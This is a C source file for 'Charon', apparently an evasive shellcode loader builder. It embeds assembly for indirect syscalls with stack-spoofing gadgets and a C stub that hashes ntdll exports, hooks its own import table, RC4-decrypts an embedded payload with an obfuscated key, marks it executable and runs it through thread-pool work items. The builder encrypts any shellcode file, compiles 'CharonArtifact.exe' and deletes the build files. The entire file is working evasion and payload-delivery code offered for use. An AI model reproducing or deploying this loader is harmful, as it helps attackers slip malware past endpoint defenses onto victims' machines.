#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

// =================================================================================
//  PART 1: EMBEDDED ASSEMBLY (STACK SPOOFER & INDIRECT SYSCALL)
// =================================================================================
const char *g_HellHallAsm = 
    "EXTERN qTableAddr:QWORD\n"
    "EXTERN qGadgetAddress:QWORD\n"
    "EXTERN qGadgetType:DWORD\n"
    "EXTERN qSavedReg:QWORD\n"
    "EXTERN qSavedRetAddr:QWORD\n"
    ".code\n"
    "    PUBLIC SetTableAddr\n"
    "    SetTableAddr PROC\n"
    "        mov qTableAddr, rcx\n"
    "        mov qGadgetAddress, rdx\n"
    "        mov qGadgetType, r8d\n"
    "        xor rax, rax\n"
    "        inc rax\n"
    "        ret\n"
    "    SetTableAddr ENDP\n"
    "\n"
    "    SyscallExec PROC\n"
    "        mov r10, rcx\n"
    "        cmp qGadgetType, 0\n"
    "        je UseRBX\n"
    "        cmp qGadgetType, 1\n"
    "        je UseRDI\n"
    "        cmp qGadgetType, 2\n"
    "        je UseRSI\n"
    "        cmp qGadgetType, 3\n"
    "        je UseR12\n"
    "        cmp qGadgetType, 4\n"
    "        je UseR13\n"
    "        cmp qGadgetType, 5\n"
    "        je UseR14\n"
    "        cmp qGadgetType, 6\n"
    "        je UseR15\n"
    "        jmp UseRBX\n"
    "    UseRBX:\n"
    "        mov qSavedReg, rbx\n"
    "        lea rbx, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseRDI:\n"
    "        mov qSavedReg, rdi\n"
    "        lea rdi, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseRSI:\n"
    "        mov qSavedReg, rsi\n"
    "        lea rsi, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR12:\n"
    "        mov qSavedReg, r12\n"
    "        lea r12, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR13:\n"
    "        mov qSavedReg, r13\n"
    "        lea r13, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR14:\n"
    "        mov qSavedReg, r14\n"
    "        lea r14, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR15:\n"
    "        mov qSavedReg, r15\n"
    "        lea r15, BackFromKernel\n"
    "        jmp DoCall\n"
    "\n"
    "    DoCall:\n"
    "        push rdx\n"
    "        mov rdx, 20h\n"
    "        mul rdx\n"
    "        mov rdx, qTableAddr\n"
    "        add rdx, rax\n"
    "        mov rax, [rdx + 08h]\n"
    "        mov r11, [rdx + 10h]\n"
    "        pop rdx\n"
    "        pop rcx\n"
    "        mov qSavedRetAddr, rcx\n"
    "        mov rcx, r10\n"
    "        push qGadgetAddress ; Push 'JMP REG' gadget addr\n"
    "        jmp r11\n"
    "\n"
    "    BackFromKernel:\n"
    "        cmp qGadgetType, 0\n"
    "        je RestRBX\n"
    "        cmp qGadgetType, 1\n"
    "        je RestRDI\n"
    "        cmp qGadgetType, 2\n"
    "        je RestRSI\n"
    "        cmp qGadgetType, 3\n"
    "        je RestR12\n"
    "        cmp qGadgetType, 4\n"
    "        je RestR13\n"
    "        cmp qGadgetType, 5\n"
    "        je RestR14\n"
    "        cmp qGadgetType, 6\n"
    "        je RestR15\n"
    "        jmp RestRBX\n"
    "    RestRBX:\n"
    "        mov rbx, qSavedReg\n"
    "        jmp Fin\n"
    "    RestRDI:\n"
    "        mov rdi, qSavedReg\n"
    "        jmp Fin\n"
    "    RestRSI:\n"
    "        mov rsi, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR12:\n"
    "        mov r12, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR13:\n"
    "        mov r13, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR14:\n"
    "        mov r14, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR15:\n"
    "        mov r15, qSavedReg\n"
    "        jmp Fin\n"
    "    Fin:\n"
    "        mov r11, qSavedRetAddr\n"
    "        jmp r11\n"
    "    SyscallExec ENDP\n";

// =================================================================================
//  PART 2: MONOLITHIC C TEMPLATE (THE ARTIFACT)
// =================================================================================
const char *g_StubTemplate =
    "#include <windows.h>\n"
    "#include <stdio.h>\n"
    "#include <string.h>\n"
    "\n"
    "// --- [SECTION 1] GLOBALS FOR ASM ---\n"
    "void* qTableAddr = NULL;\n"
    "void* qGadgetAddress = NULL;\n"
    "DWORD qGadgetType = 0;\n"
    "void* qSavedReg = NULL;\n"
    "void* qSavedRetAddr = NULL;\n"
    "\n"
    "// --- [SECTION 2] INTERNAL STRUCTS ---\n"
    "typedef struct _SYSCALL_ENTRY {\n"
    "    PVOID pAddress;      // 0x00\n"
    "    DWORD64 dwSsn;       // 0x08\n"
    "    PVOID pSyscallRet;   // 0x10\n"
    "    DWORD64 dwHash;      // 0x18\n"
    "} SYSCALL_ENTRY, *PSYSCALL_ENTRY;\n"
    "\n"
    "typedef struct _SYSCALL_LIST {\n"
    "    DWORD Count;\n"
    "    SYSCALL_ENTRY Entries[1024];\n"
    "} SYSCALL_LIST, *PSYSCALL_LIST;\n"
    "\n"
    "typedef struct _USTRING { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTRING, *PUSTRING;\n"
    "typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;\n"
    "typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
    "typedef struct _PEB { BYTE Reserved[24]; PPEB_LDR_DATA Ldr; } PEB, *PPEB;\n"
    "\n"
    "// --- GLOBALS ---\n"
    "SYSCALL_LIST SyscallList;\n"
    "extern void SetTableAddr(PVOID pTable, PVOID pGadget, DWORD dwType);\n"
    "extern void Fnc0000(); // Ref to base of stubs\n"
    "\n"
    "// --- [SECTION 3] HELPERS ---\n"
    "DWORD64 djb2(PBYTE str) {\n"
    "    DWORD64 dwHash = 0x7734773477347734;\n"
    "    INT c;\n"
    "    while (c = (INT)((char)*str++)) dwHash = ((dwHash << 0x5) + dwHash) + c;\n"
    "    return dwHash;\n"
    "}\n"
    "\n"
    "PVOID GetNextSyscallInstruction(PVOID pAddress) {\n"
    "    for (DWORD i = 0; i <= 32; i++) {\n"
    "        if (*((PBYTE)pAddress + i) == 0x0f && *((PBYTE)pAddress + i + 1) == 0x05 && *((PBYTE)pAddress + i + 2) == 0xc3) {\n"
    "            return (PVOID)((ULONG_PTR)pAddress + i);\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    "DWORD64 GetSSN(PVOID pAddress) {\n"
    "    if (*((PBYTE)pAddress) == 0x4c && *((PBYTE)pAddress + 3) == 0xb8) return *((PBYTE)pAddress + 4);\n"
    "    for (WORD idx = 1; idx <= 32; idx++) {\n"
    "        if (*((PBYTE)pAddress + idx * 32) == 0x4c && *((PBYTE)pAddress + idx * 32 + 3) == 0xb8)\n"
    "            return *((PBYTE)pAddress + idx * 32 + 4) - idx;\n"
    "        if (*((PBYTE)pAddress - idx * 32) == 0x4c && *((PBYTE)pAddress - idx * 32 + 3) == 0xb8)\n"
    "            return *((PBYTE)pAddress - idx * 32 + 4) + idx;\n"
    "    }\n"
    "    return -1;\n"
    "}\n"
    "\n"
    "PVOID FindGadgetInModule(const char* sModule, DWORD* outType) {\n"
    "    PVOID pModule = (PVOID)GetModuleHandleA(sModule);\n"
    "    if (!pModule) return NULL;\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + pDos->e_lfanew);\n"
    "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
    "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
    "        if (pSection[i].Characteristics & 0x20000020) {\n"
    "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + pSection[i].VirtualAddress);\n"
    "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
    "            for (DWORD z = 0; z < dwSize - 2; z++) {\n"
    "                // RBX (0): FF E3\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE3) { *outType = 0; return (PVOID)(pStart + z); }\n"
    "                // RDI (1): FF E7\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE7) { *outType = 1; return (PVOID)(pStart + z); }\n"
    "                // RSI (2): FF E6\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE6) { *outType = 2; return (PVOID)(pStart + z); }\n"
    "                // R12 (3): 41 FF E4\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE4) { *outType = 3; return (PVOID)(pStart + z); }\n"
    "                // R13 (4): 41 FF E5\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE5) { *outType = 4; return (PVOID)(pStart + z); }\n"
    "                // R14 (5): 41 FF E6\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE6) { *outType = 5; return (PVOID)(pStart + z); }\n"
    "                // R15 (6): 41 FF E7\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE7) { *outType = 6; return (PVOID)(pStart + z); }\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    "// --- [SECTION 4] INIT ENGINE ---\n"
    "BOOL InitApi() {\n"
    "    PVOID ntdllBase = GetModuleHandleA(\"ntdll.dll\");\n"
    "    if(!ntdllBase) return FALSE;\n"
    "    \n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdllBase;\n"
    "    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pDos->e_lfanew);\n"
    "    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;\n"
    "    \n"
    "    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
    "    PDWORD pdwFunctions = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfFunctions);\n"
    "    PDWORD pdwNames = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfNames);\n"
    "    PWORD pwOrdinals = (PWORD)((PBYTE)ntdllBase + pExport->AddressOfNameOrdinals);\n"
    "    \n"
    "    DWORD idx = 0;\n"
    "    \n"
    "    // 1. Find Stack Spoof Gadget\n"
    "    qGadgetAddress = FindGadgetInModule(\"kernel32.dll\", &qGadgetType);\n"
    "    if(!qGadgetAddress) qGadgetAddress = FindGadgetInModule(\"ntdll.dll\", &qGadgetType);\n"
    "    if(!qGadgetAddress) { printf(\"[!] Gadget not found\\n\"); return FALSE; }\n"
    "    \n"
    "    printf(\"[+] Found Gadget at %p (Type: %d)\\n\", qGadgetAddress, qGadgetType);\n"
    "    SetTableAddr(SyscallList.Entries, qGadgetAddress, qGadgetType);\n"
    "    \n"
    "    for (WORD i = 0; i < pExport->NumberOfNames; i++) {\n"
    "        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);\n"
    "        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];\n"
    "        \n"
    "        USHORT prefix = *(USHORT*)pcName;\n"
    "        if (prefix != 0x744E && prefix != 0x775A) continue;\n"
    "        \n"
    "        DWORD64 dwSsn = GetSSN(pAddress);\n"
    "        if (dwSsn == -1) continue;\n"
    "        \n"
    "        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);\n"
    "        if (!pSyscallRet) continue;\n"
    "        \n"
    "        SyscallList.Entries[idx].pAddress = pAddress;\n"
    "        SyscallList.Entries[idx].dwSsn = dwSsn;\n"
    "        SyscallList.Entries[idx].pSyscallRet = pSyscallRet;\n"
    "        SyscallList.Entries[idx].dwHash = djb2((PBYTE)pcName);\n"
    "        \n"
    "        idx++;\n"
    "        if (idx >= 1024) break;\n"
    "    }\n"
    "    SyscallList.Count = idx;\n"
    "    return TRUE;\n"
    "}\n"
    "\n"
    "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
    "\n"
    "void InstallIATHooks() {\n"
    "    PVOID pModule = GetModuleHandleA(NULL);\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);\n"
    "    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) return;\n"
    "    \n"
    "    // Helper for indirect syscall\n"
    "    int idxProtect = -1;\n"
    "    DWORD64 hProt = 0x858BCB1046FB6A37; // NtProtectVirtualMemory\n"
    "    for(int i=0; i<SyscallList.Count; i++) {\n"
    "        if(SyscallList.Entries[i].dwHash == hProt) { idxProtect = i; break; }\n"
    "    }\n"
    "    if(idxProtect == -1) return;\n"
    "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase + (idxProtect * 16));\n"
    "\n"
    "    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n"
    "    while (pImport->Name) {\n"
    "        char* szModName = (char*)((PBYTE)pModule + pImport->Name);\n"
    "        if (_stricmp(szModName, \"ntdll.dll\") == 0) {\n"
    "            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pModule + pImport->FirstThunk);\n"
    "            PIMAGE_THUNK_DATA pOrgThunk = (PIMAGE_THUNK_DATA)((PBYTE)pModule + pImport->OriginalFirstThunk);\n"
    "            if(!pOrgThunk) pOrgThunk = pThunk;\n"
    "            \n"
    "            while (pOrgThunk->u1.Function) {\n"
    "                if (!(pOrgThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {\n"
    "                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pModule + pOrgThunk->u1.AddressOfData);\n"
    "                    DWORD64 dwHash = djb2((PBYTE)pImportName->Name);\n"
    "                    for(DWORD i=0; i < SyscallList.Count; i++) {\n"
    "                        if (SyscallList.Entries[i].dwHash == dwHash) {\n"
    "                            PVOID pCtx = (PVOID)(&pThunk->u1.Function);\n"
    "                            SIZE_T sSize = sizeof(PVOID);\n"
    "                            DWORD oldProtect = 0;\n"
    "                            if(fProt((HANDLE)-1, &pCtx, &sSize, PAGE_READWRITE, &oldProtect) == 0) {\n"
    "                                PVOID pNewFunc = (PVOID)(pStubBase + (i * 16));\n"
    "                                pThunk->u1.Function = (ULONG_PTR)pNewFunc;\n"
    "                                fProt((HANDLE)-1, &pCtx, &sSize, oldProtect, &oldProtect);\n"
    "                            }\n"
    "                            break;\n"
    "                        }\n"
    "                    }\n"
    "                }\n"
    "                pThunk++;\n"
    "                pOrgThunk++;\n"
    "            }\n"
    "        }\n"
    "        pImport++;\n"
    "    }\n"
    "}\n"
    "\n"
    "// --- [SECTION 5] CONFIG & PAYLOAD ---\n"
    "#define KEY_SIZE 16\n"
    "#define HINT_BYTE {{HINT_BYTE}}\n"
    "unsigned char Payload[] = { {{PAYLOAD_BYTES}} };\n"
    "unsigned char Key[] = { {{KEY_BYTES}} };\n"
    "\n"
    "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
    "typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
    "typedef NTSTATUS (NTAPI *fnTpAllocWork)(PVOID*, PVOID, PVOID, PVOID);\n"
    "typedef NTSTATUS (NTAPI *fnTpPostWork)(PVOID);\n"
    "typedef NTSTATUS (NTAPI *fnTpWaitForWork)(PVOID, BOOLEAN);\n"
    "typedef NTSTATUS (NTAPI *fnTpReleaseWork)(PVOID);\n"
    "\n"
    "int main() {\n"
    "    PVOID pAddr = NULL; SIZE_T sSize = sizeof(Payload); DWORD dwOld = 0; HANDLE hProc = (HANDLE)-1;\n"
    "    \n"
    "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
    "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return -1; }\n"
    "    printf(\"[+] Installing IAT Hooks...\\n\");\n"
    "    InstallIATHooks();\n"
    "\n"
    "    DWORD64 hAlloc = 0xF5BD373480A6B89B; // NtAllocateVirtualMemory\n"
    "    int idxAlloc = -1, idxProtect = -1;\n"
    "    for(int i=0; i<SyscallList.Count; i++) {\n"
    "        if(SyscallList.Entries[i].dwHash == hAlloc) idxAlloc = i;\n"
    "    }\n"
    "    if (idxAlloc == -1) return -1;\n"
    "    \n"
    "    // Use STUB for Allocation (Indirect + Stack Spoof)\n"
    "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
    "    fnNtAllocateVirtualMemory fAlloc = (fnNtAllocateVirtualMemory)(pStubBase + (idxAlloc * 16));\n"
    "    \n"
    "    printf(\"[+] Allocating payload memory...\\n\");\n"
    "    NTSTATUS status = fAlloc(hProc, &pAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
    "    if(status != 0) { printf(\"[!] Allocation Failed: 0x%X\\n\", status); return -1; }\n"
    "\n"
    "    printf(\"[+] Decrypting payload...\\n\");\n"
    "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; \n"
    "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
    "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, Payload};\n"
    "    fnSystemFunction032 Decrypt = (fnSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\");\n"
    "    memcpy(pAddr, Payload, sizeof(Payload));\n"
    "    d.Buffer = pAddr;\n"
    "    Decrypt(&d, &k);\n"
    "\n"
    "    // Resolve Protect\n"
    "    DWORD64 hProt = 0x858BCB1046FB6A37; \n"
    "    for(int i=0; i<SyscallList.Count; i++) {\n"
    "        if(SyscallList.Entries[i].dwHash == hProt) idxProtect = i;\n"
    "    }\n"
    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase + (idxProtect * 16));\n"
    "\n"
    "    printf(\"[+] Changing permissions to RX...\\n\");\n"
    "    status = fProt(hProc, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);\n"
    "    if(status != 0) { printf(\"[!] Protect Failed: 0x%X\\n\", status); return -1; }\n"
    "\n"
    "    printf(\"[+] Execution handed over to Thread Pool.\\n\");\n"
    "    HMODULE hNt = GetModuleHandleA(\"ntdll.dll\");\n"
    "    fnTpAllocWork TpAlloc = (fnTpAllocWork)GetProcAddress(hNt, \"TpAllocWork\");\n"
    "    fnTpPostWork TpPost = (fnTpPostWork)GetProcAddress(hNt, \"TpPostWork\");\n"
    "    PVOID pWork = NULL;\n"
    "    TpAlloc(&pWork, pAddr, NULL, NULL);\n"
    "    TpPost(pWork);\n"
    "    ((fnTpWaitForWork)GetProcAddress(hNt, \"TpWaitForWork\"))(pWork, FALSE);\n"
    "    ((fnTpReleaseWork)GetProcAddress(hNt, \"TpReleaseWork\"))(pWork);\n"
    "\n"
    "    printf(\"[+] Finished. Press Enter to exit.\\n\");\n"
    "    getchar();\n"
    "    return 0;\n"
    "}\n";

// =================================================================================
//  PART 3: BUILDER LOGIC
// =================================================================================
typedef struct _USTRING_BUILDER {
  DWORD Length;
  DWORD MaximumLength;
  PVOID Buffer;
} USTRING;
typedef NTSTATUS(NTAPI *fnSystemFunction032)(USTRING *Img, USTRING *Key);

void RC4_Encrypt(unsigned char *key, DWORD keySize, unsigned char *data, DWORD dataSize) {
  HMODULE hAdvapi = LoadLibraryA("Advapi32.dll");
  if (!hAdvapi) return;
  fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
  if (SystemFunction032) {
    USTRING uKey = {keySize, keySize, key};
    USTRING uData = {dataSize, dataSize, data};
    SystemFunction032(&uData, &uKey);
  }
  FreeLibrary(hAdvapi);
}

unsigned char *ReadFileBytes(const char *filename, DWORD *outSize) {
  FILE *f = fopen(filename, "rb");
  if (!f) return NULL;
  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  rewind(f);
  unsigned char *buffer = (unsigned char *)malloc(size);
  if (buffer) fread(buffer, 1, size, f);
  fclose(f);
  *outSize = (DWORD)size;
  return buffer;
}

char *BytesToHexString(unsigned char *data, DWORD size) {
  char *hexStr = (char *)malloc(size * 6 + 10);
  if (!hexStr) return NULL;
  char *ptr = hexStr;
  for (DWORD i = 0; i < size; i++) {
    if (i < size - 1) ptr += sprintf(ptr, "0x%02X, ", data[i]);
    else ptr += sprintf(ptr, "0x%02X", data[i]);
  }
  return hexStr;
}

char *ReplacePattern(const char *original, const char *pattern, const char *replacement) {
  if (!original || !pattern || !replacement) return NULL;
  int newWlen = strlen(replacement);
  int oldWlen = strlen(pattern);
  int cnt = 0;
  const char *p = original;
  while ((p = strstr(p, pattern))) { cnt++; p += oldWlen; }

  size_t newSize = strlen(original) + cnt * (newWlen - oldWlen) + 1;
  char *result = (char *)malloc(newSize);
  struct _USTRING_BUILDER * u = NULL; // unused
  if (!result) return NULL;

  char *dest = result;
  p = original;
  const char *found;
  while ((found = strstr(p, pattern))) {
    size_t len = found - p;
    memcpy(dest, p, len);
    dest += len;
    memcpy(dest, replacement, newWlen);
    dest += newWlen;
    p = found + oldWlen;
  }
  strcpy(dest, p);
  return result;
}

int main(int argc, char *argv[]) {
  printf("\n"
         "   _____ _    _          _____  ____  _   _ \n"
         "  / ____| |  | |   /\\   |  __ \\|  _ \\| \\ | |\n"
         " | |    | |__| |  /  \\  | |__) | | | |  \\| |\n"
         " | |    |  __  | / /\\ \\ |  _  /| | | | . ` |\n"
         " | |____| |  | |/ ____ \\| | \\ \\| |_| | |\\  |\n"
         "  \\_____|_|  |_/_/    \\_\\_|  \\_\\____/|_| \\_|\n"
         "        Artifact Builder & Obfuscator        \n"
         "\n");

  if (argc < 2) {
    printf("Usage: Charon.exe <shellcode_file>\n");
    return 1;
  }

  srand((unsigned int)time(NULL));
  const char *shellcodeFile = argv[1];

  // 1. Read Payload
  DWORD shellcodeSize = 0;
  unsigned char *shellcode = ReadFileBytes(shellcodeFile, &shellcodeSize);
  if (!shellcode) { printf("[!] Failed to read file.\n"); return 1; }

  // 2. Encrypt Payload
  printf("[*] Encrypting (RC4 + KeyGuard)...\n");
  unsigned char realKey[16], protectedKey[16];
  for (int i = 0; i < 16; i++) realKey[i] = rand() % 255;
  RC4_Encrypt(realKey, 16, shellcode, shellcodeSize);

  unsigned char b = (rand() % 200) + 1;
  for (int i = 0; i < 16; i++) protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
  unsigned char hintByte = protectedKey[0] ^ b;

  char *sPayload = BytesToHexString(shellcode, shellcodeSize);
  char *sKey = BytesToHexString(protectedKey, 16);
  char sHint[10]; sprintf(sHint, "0x%02X", hintByte);

  // 3. Write ASM File
  printf("[*] Generating syscalls.asm (HellHall + 1024 Stubs)...\n");
  FILE *fAsm = fopen("syscalls.asm", "w");
  if (fAsm) { 
      fputs(g_HellHallAsm, fAsm);
      // Append 1024 Stubs
      for (int i = 0; i < 1024; i++) {
          fprintf(fAsm, "    PUBLIC Fnc%04X\n", i);
          fprintf(fAsm, "    ALIGN 16\n"); 
          fprintf(fAsm, "    Fnc%04X PROC\n", i);
          fprintf(fAsm, "        mov eax, %d\n", i); // Pass Index to SyscallExec
          fprintf(fAsm, "        jmp SyscallExec\n");
          fprintf(fAsm, "    Fnc%04X ENDP\n\n", i);
      }
      fprintf(fAsm, "end\n");
      fclose(fAsm); 
  }

  // 4. Assemble
  printf("[*] Assembling (ML64)...\n");
  if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
    printf("[!] Assembly Failed.\n");
    return 1;
  }

  // 5. Generate C Source
  printf("[*] Generating artifact.c...\n");
  char *step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
  char *step2 = ReplacePattern(step1, "{{PAYLOAD_BYTES}}", sPayload);
  char *finalSource = ReplacePattern(step2, "{{KEY_BYTES}}", sKey);

  FILE *fC = fopen("artifact.c", "w");
  if (fC) { fputs(finalSource, fC); fclose(fC); }

  // 6. Compile
  printf("[*] Compiling Artifact (CL)...\n");
  int res = system("cl /nologo /O2 artifact.c syscalls.obj /Fe:CharonArtifact.exe /link /CETCOMPAT:NO");

  // 7. Cleanup
  system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");
  free(step1); free(step2); free(finalSource); free(sPayload); free(sKey); free(shellcode);

  if (res == 0) printf("\n[+] SUCCESS: CharonArtifact.exe created.\n");
  else printf("\n[!] FAILURE: Compilation error.\n");

  return 0;
}
